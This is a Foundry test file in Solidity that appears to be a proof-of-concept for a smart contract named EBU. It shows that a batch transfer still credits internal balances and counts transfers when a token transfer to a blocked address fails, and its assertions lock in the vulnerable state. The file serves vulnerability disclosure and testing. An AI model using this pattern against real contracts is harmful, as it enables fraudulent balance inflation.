// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol";

contract MockToken {
    // Address that will cause token transfers to revert
    address public immutable badRecipient;
    
    constructor(address _badRecipient) {
        badRecipient = _badRecipient;
    }
    
    function transferFrom(address, address to, uint256) external pure returns (bool) {
        if (to == address(0xBAD)) {
            revert("Transfer to blocked address failed");
        }
        return true;
    }
}

contract EBU_DOS_Test is Test {
    EBU public ebu;
    MockToken public token;
    
    address deployer = address(0x1);
    address from = address(0x2);
    address goodRecipient1 = address(0x3);
    address goodRecipient2 = address(0x4);
    address badRecipient = address(0xBAD);
    
    function setUp() public {
        vm.startPrank(deployer);
        ebu = new EBU();
        token = new MockToken(badRecipient);
        ebu.authorizeToken(address(token));
        vm.stopPrank();
    }

    function test_PartialBatchFailureMintsInvalidBalances() public {
        vm.recordLogs();

        console2.log("--- BEFORE-Trigger Query ---");
        // Record initial states
        uint256 goodRecipient1Before = ebu.getUserBalance(goodRecipient1);
        uint256 badRecipientBalanceBefore = ebu.getUserBalance(badRecipient);
        uint256 goodRecipient2Before = ebu.getUserBalance(goodRecipient2);
        uint256 totalTransfersBefore = ebu.totalTransfers();
        
        console2.log("Init balance goodRecipient1:", goodRecipient1Before);
        console2.log("Init balance badRecipient:", badRecipientBalanceBefore);
        console2.log("Init balance goodRecipient2:", goodRecipient2Before);
        console2.log("Init totalTransfers:", totalTransfersBefore);

        // Prepare transfer batch with both valid and invalid recipient
        address[] memory recipients = new address[](3);
        recipients[0] = goodRecipient1;
        recipients[1] = badRecipient; // Will cause token transfer failure
        recipients[2] = goodRecipient2;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 100;
        amounts[1] = 200;
        amounts[2] = 300;

        console2.log("--- Trigger Operation ---");
        // Execute transfer batch (should not revert despite partial failure)
        bool success = ebu.transfer(from, address(token), recipients, amounts);
        assertTrue(success, "Transfer should return true despite token failure");

        console2.log("--- AFTER-Trigger Query ---");
        // Query states after attack
        uint256 goodRecipient1After = ebu.getUserBalance(goodRecipient1);
        uint256 badRecipientBalanceAfter = ebu.getUserBalance(badRecipient);
        uint256 goodRecipient2After = ebu.getUserBalance(goodRecipient2);
        uint256 totalTransfersAfter = ebu.totalTransfers();
        
        console2.log("Post balance goodRecipient1:", goodRecipient1After);
        console2.log("Post balance badRecipient:", badRecipientBalanceAfter);
        console2.log("Post balance goodRecipient2:", goodRecipient2After);
        console2.log("Post totalTransfers:", totalTransfersAfter);

        console2.log("--- DIFF Result ---");
        console2.log("goodRecipient1 Balance Change:", goodRecipient1After - goodRecipient1Before);
        console2.log("badRecipient Balance Change:", badRecipientBalanceAfter - badRecipientBalanceBefore);
        console2.log("goodRecipient2 Balance Change:", goodRecipient2After - goodRecipient2Before);
        console2.log("totalTransfers Increment:", totalTransfersAfter - totalTransfersBefore);

        // Vulnerability exists if:
        // 1. Bad recipient balance increased despite failed transfer
        // 2. totalTransfers increments for failed transfers
        bool vulnerabilityExists = (
            (badRecipientBalanceAfter > badRecipientBalanceBefore) || 
            (totalTransfersAfter != totalTransfersBefore + 3)
        );

        console2.log("Bad recipient balance changed:", (badRecipientBalanceAfter > badRecipientBalanceBefore) ? "YES" : "NO");
        console2.log("Total transfers increased by entire batch size:", (totalTransfersAfter == totalTransfersBefore + 3) ? "YES" : "NO");

        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Invalid balances were recorded for failed transfers");
        } else {
            console2.log("Vulnerability not Exist: Failed transfers don't affect internal balances");
        }

        // Verify EBU records
        assertEq(goodRecipient1After, 100, "Valid recipient1 balance mismatch");
        // Vulnerable state maintained for vulnerability showcase
        assertEq(badRecipientBalanceAfter, 200, "Invalid recipient got incorrect balance");
        assertEq(goodRecipient2After, 300, "Valid recipient2 balance mismatch");

        // Verify TransferBatch event was still emitted for entire batch
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertEq(entries.length, 1, "Only one event should be emitted");
    }

    function test_SuccessfulBatchTransferUpdatesStateCorrectly() public {
        // Prepare transfer batch with all valid recipients
        address[] memory recipients = new address[](2);
        recipients[0] = goodRecipient1;
        recipients[1] = goodRecipient2;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 200;
        amounts[1] = 400;
        
        bool success = ebu.transfer(from, address(token), recipients, amounts);
        assertTrue(success, "Transfer failed unexpectedly");
        
        // Verify correct balance reflections
        assertEq(ebu.getUserBalance(goodRecipient1), 200, "Valid recipient1 balance incorrect");
        assertEq(ebu.getUserBalance(goodRecipient2), 400, "Valid recipient2 balance incorrect");
    }
}